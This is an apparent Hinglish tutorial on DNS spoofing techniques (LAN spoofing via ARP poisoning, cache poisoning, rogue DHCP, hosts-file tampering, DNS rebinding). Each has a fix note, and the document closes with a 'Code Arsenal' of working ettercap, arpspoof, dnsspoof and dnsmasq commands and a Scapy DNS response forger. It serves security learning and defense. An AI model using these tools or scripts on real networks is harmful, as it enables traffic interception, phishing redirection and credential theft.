FOUNDATION

01. DNS Resolution Kaise Kaam Karta Hai (Pehle Yeh Samjho)

Spoofing samajhne se pehle normal flow samajhna zaroori hai. Jab tum target.com browser mein type karte ho, teen jagah IP-lookup ho sakta hai — har jagah spoofing ka apna alag tareeka hai.

Normal Flow

  1. Device pehle apni local hosts file check karta hai (agar entry hai to seedha wahi use hota hai).
  2. Fir apna configured DNS resolver (router se mila, ya manually set — jaise 8.8.8.8) se poochta hai.
  3. Wo resolver — agar cache mein nahi hai — root servers se shuru karke .com nameservers, fir target.com ke authoritative nameserver tak jaake asli IP nikaalta hai.
  4. Jawab wapas aata hai, device us IP pe connect karta hai.
Tum: "target.com ka IP?" Local hosts file → kuch nahi mila Router/DNS resolver → "wait, pooch ke aata hoon" Authoritative nameserver → "93.184.216.34" Tumhara browser → us IP pe connect ho gaya
💥 Note: Spoofing ka matlab hai — kisi bhi is step ko bech mein intercept karke galat jawab de dena.
🛡 Reminder: In teeno jagah (hosts file, local network, resolver) ko alag-alag attack kiya ja sakta hai — neeche ek-ek dekhenge.
LAB PRACTICE

02. Local Network (LAN) DNS Spoofing — Same WiFi Wale Victim Pe

Sabse common practical tareeka — agar attacker aur victim same network (WiFi/LAN) pe hain, to ARP spoofing se pehle "man-in-the-middle" banke, fir DNS queries ko intercept karke fake response bheja ja sakta hai.

Steps (Sirf Apne Lab/Isolated Network Mein)

  1. Pehle ARP spoofing se victim aur router ke beech apne aap ko "beech mein" laao (traffic tumse hoke guzre).
  2. IP forwarding enable karo apni machine pe (taaki victim ka internet chalta rahe, sirf traffic tumse hoke jaaye).
  3. Ek DNS-spoofing tool (Ettercap/dnsspoof) chalao jo specific domain ke liye fake IP reply kare.
  4. Victim jab target-domain browse kare, uske DNS query ka jawab tumhari machine deti hai (asli DNS server se pehle) — fake IP (jo tumhara controlled server hai).
  5. Victim ka browser tumhare fake server pe pahunch jaata hai — jahan tum phishing-page ya monitoring page daal sakte ho.
# /etc/ettercap/etter.dns mein entry: target.com A 192.168.1.50 # attacker ka IP
💥 Impact: Victim ko lagta hai wo asli site pe hai, lekin actually attacker ke server pe hai — credentials theft, malware serve karna possible.
🛡 Fix: HTTPS + HSTS use karo (certificate mismatch se pakda jaata hai), encrypted DNS (DoH/DoT) use karo, network-level ARP-spoofing detection tools rakho.
EXPERT

03. DNS Cache Poisoning (Off-Path / Kaminsky-Style)

Yeh advanced technique hai jahan attacker victim ke same-network pe hue bina bhi, ek DNS resolver ke cache mein galat entry "inject" karne ki koshish karta hai — taaki us resolver ko use karne wale SAARE users galat IP pe bhejein.

Concept Samjho (Theoretical, Lab-Only)

  1. Jab ek DNS resolver kisi domain ke liye query bhejta hai (kyunki cache mein nahi hai), wo ek random Transaction ID (16-bit) ke saath jaata hai.
  2. Attacker resolver ko forge kiye hue bahut saare fake-response bhejta hai (alag-alag guessed Transaction IDs ke saath), pehle se predict karke ki resolver kab query bhejega.
  3. Agar koi ek fake-response ka Transaction ID match ho jaaye asli query se — resolver usko "asli" jawab maan ke apne cache mein save kar leta hai.
  4. Ab jab tak cache expire na ho, us resolver ko use karne wala HAR user galat IP pe bhejta rehta hai.
// Yeh purane/misconfigured DNS resolvers pe kaam karta tha jinme: - Transaction ID predictable/sequential thi - Source port bhi fixed/predictable thi - Modern resolvers dono ko randomize karte hain — isliye attack mushkil ho gaya hai
💥 Impact: Ek hi successful poisoning se poore ISP/organization ke saare users affected ho sakte hain — mass-scale impact.
🛡 Fix: DNSSEC (cryptographic signing) use karo, source-port randomization + transaction-ID randomization already-modern resolvers mein built-in hai.
LAB PRACTICE

04. Rogue DHCP Server + DNS Redirect

Ek aur LAN-based tareeka — agar tum network pe apna khud ka DHCP server chala do jo tumhare configured DNS server ko "default DNS" bata de, to jo bhi naya device network join karega, uski saari DNS queries automatically tumhare (attacker ke) DNS server se hoke jaayengi.

Steps (Sirf Apne Lab Mein)

  1. Apna khud ka malicious DHCP server setup karo jo asli router se "race" karega naye devices ko IP dene ke liye.
  2. DHCP config mein DNS-server field mein apni machine ka IP daalo.
  3. Apni machine pe ek DNS server (jaise dnsmasq) chalao jo specific domains ke liye fake IP return kare.
  4. Naya device jab network join kare aur tumhara rogue DHCP jeet jaaye race mein, uski DNS queries tumhare through jaayengi.
💥 Impact: Poora naya-joining-device automatically affected ho jaata hai bina kisi extra interaction ke.
🛡 Fix: DHCP Snooping enable karo managed switches pe, sirf trusted DHCP servers allow karo.
FOUNDATION

05. Hosts File / Local Poisoning (Malware Angle)

Simplest form — agar attacker ko victim ki machine pe pehle se hi (kisi malware/physical access se) thoda control mil chuka hai, to seedha uski local hosts file edit karke DNS lookup poori tarah bypass kiya ja sakta hai.

Concept

  1. Windows mein C:\Windows\System32\drivers\etc\hosts, Linux/Mac mein /etc/hosts file hoti hai.
  2. Is file mein manually koi bhi domain-to-IP mapping daali ja sakti hai jo DNS query se bhi pehle check hoti hai.
  3. Malware/attacker agar file edit kar de, to victim ka device kabhi asli DNS server tak poochega hi nahi — seedha fake IP use karega.
# /etc/hosts file mein entry: 192.168.1.50 target.com
💥 Impact: Sabse "silent" tareeka — network traffic bhi capture nahi hota, sab kuch local hi ho jaata hai.
🛡 Fix: File-integrity monitoring, endpoint-protection jo hosts-file changes flag kare.
WEB APP ANGLE

06. DNS Rebinding — Application-Layer Attack (Bug Bounty Relevant)

Yeh wahi concept hai jo tumhari SSRF file mein bhi tha — lekin yahan iska DNS-specific angle hai. Attacker apna khud ka domain banata hai jiska DNS record baar-baar badalta hai (bahut kam TTL ke saath) — pehli baar safe IP, dobara internal IP.

Steps

  1. Apna domain banao (jaise attacker-rebind.com) jiska DNS TTL bahut kam ho (1 second).
  2. Pehli baar resolve hone par ek safe/public IP do — validation pass ho jaaye.
  3. Turant DNS record ko internal target IP (127.0.0.1, ya kisi internal service) mein badal do.
  4. Jo bhi application URL-validation ke baad actual request bhejte waqt DOBARA DNS resolve karta hai, uski request internal IP pe chali jaayegi.
  5. Yeh khaaskar un apps mein kaam karta hai jo "URL safe hai" ek baar check karke fir request bhejte hain (validate-then-use pattern).
💥 Impact: SSRF filters/validation ko poori tarah bypass kar deta hai.
🛡 Fix: DNS ko ek hi baar resolve karo aur usi IP pe pin karke request bhejo (dobara resolve mat karo — "DNS pinning").
DEFENSE UNDERSTANDING

07. DNSSEC Kya Hai Aur Kyun Zaroori Hai (Attacker Perspective Se Bhi Samjho)

DNSSEC ek cryptographic-signing system hai jo DNS responses ko digitally sign karta hai — taaki resolver verify kar sake ki jawab asli authoritative server se aaya hai, na ki kisi spoofer se. Bug-hunting mein yeh check karna useful hai ki target DNSSEC use karta hai ya nahi.

Kaise Check Karo

  1. Target domain ke liye DNSSEC status check karo (Code Arsenal mein command hai).
  2. Agar DNSSEC disabled hai — matlab spoofing-resistance weak hai (theoretically), yeh recon-note ke liye useful info hai.
  3. Agar enabled hai, spoofing/poisoning attacks bahut zyada mushkil ho jaate hain us domain ke liye.
💥 Note: Bug bounty mein DNSSEC missing hona khud koi "bug" nahi hai, lekin recon ke liye useful signal hai.
🛡 Fix (defender ke liye): DNSSEC enable karo apne domain ke liye registrar settings mein.
DETECTION

08. Spoofing Detect Karna Aur Safe PoC Banana

Bug bounty context mein, tum kisi live production DNS infrastructure ko spoof nahi kar sakte (illegal + scope se bahar) — lekin apne lab mein practice karke concept solid samajh sakte ho, aur agar kabhi authorized DNS-infrastructure-testing scope mile, tab yeh skills kaam aayengi.

Practice Setup (Apne Lab Mein)

  1. Do virtual machines banao (VirtualBox/VMware) — ek "attacker", ek "victim" — same isolated virtual-network pe.
  2. Victim VM pe koi bhi test-domain browse karne ki koshish karo.
  3. Attacker VM se upar wali techniques try karo (Ettercap/dnsspoof).
  4. Wireshark se traffic capture karke dekho DNS response kaise forge hui.
💥 Impact: Isolated lab practice se concept clear hota hai bina kisi real-world risk ke.
🛡 Reminder: Kabhi bhi apne ghar/office ke real network ya kisi third-party network pe yeh mat try karna — sirf apne khud ke isolated VMs mein.

💾 CODE ARSENAL — DNS SPOOFING

Ready-to-use commands — sirf apne isolated lab mein use karo

🔧 Ettercap — DNS Spoofing Setup (Lab-Only)

# etter.dns file edit karo (location: /etc/ettercap/etter.dns) target.com A 192.168.1.50 *.target.com A 192.168.1.50 # Ettercap chalao GUI mode mein sudo ettercap -G # Ya command-line mode mein (ARP-spoof + DNS-spoof plugin) sudo ettercap -T -q -i eth0 -M arp:remote /victim-ip// /router-ip// -P dns_spoof

🐍 dnsspoof (dsniff suite) — Basic Usage

# hosts file jaisa ek spoof-config banao echo "192.168.1.50 target.com" > dnsspoof.hosts # chalao (IP forwarding pehle enable karo) sudo sysctl -w net.ipv4.ip_forward=1 sudo dnsspoof -i eth0 -f dnsspoof.hosts

🔀 ARP Spoofing (DNS Spoofing Se Pehle Zaroori Step)

# arpspoof se victim aur router dono ko target karo sudo arpspoof -i eth0 -t <victim-ip> <router-ip> sudo arpspoof -i eth0 -t <router-ip> <victim-ip> # dono terminal mein alag-alag parallel chalao

🖥️ dnsmasq — Rogue DHCP + DNS Server Config

# /etc/dnsmasq.conf interface=eth0 dhcp-range=192.168.1.100,192.168.1.200,12h dhcp-option=6,192.168.1.50 # apna IP as DNS server address=/target.com/192.168.1.50 # chalao sudo dnsmasq -C /etc/dnsmasq.conf -d

🦈 Wireshark — DNS Traffic Capture/Analyze Karna

# Command-line se DNS traffic capture sudo tcpdump -i eth0 udp port 53 -w dns_capture.pcap # Wireshark filter (GUI mein use karo) dns # Sirf responses dekhne ke liye dns.flags.response == 1

🔍 DNSSEC Status Check Karna

# dig se DNSSEC records check karo dig target.com DNSKEY dig target.com +dnssec # Online tool https://dnssec-analyzer.verisignlabs.com/target.com

🌐 Encrypted DNS Check (DoH/DoT — Defense Verify Karna)

# DNS-over-HTTPS test curl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=target.com&type=A' # DNS-over-TLS test (kdig tool se) kdig -d @1.1.1.1 +tls target.com

🧪 Python — Simple DNS Response Forger (Scapy, Lab-Only)

from scapy.all import * def spoof_dns(pkt): if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0: spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \ UDP(dport=pkt[UDP].sport, sport=53) / \ DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.1.50")) send(spoofed, verbose=0) print(f"Spoofed response sent for {pkt[DNS].qd.qname}") sniff(filter="udp port 53", prn=spoof_dns, store=0)
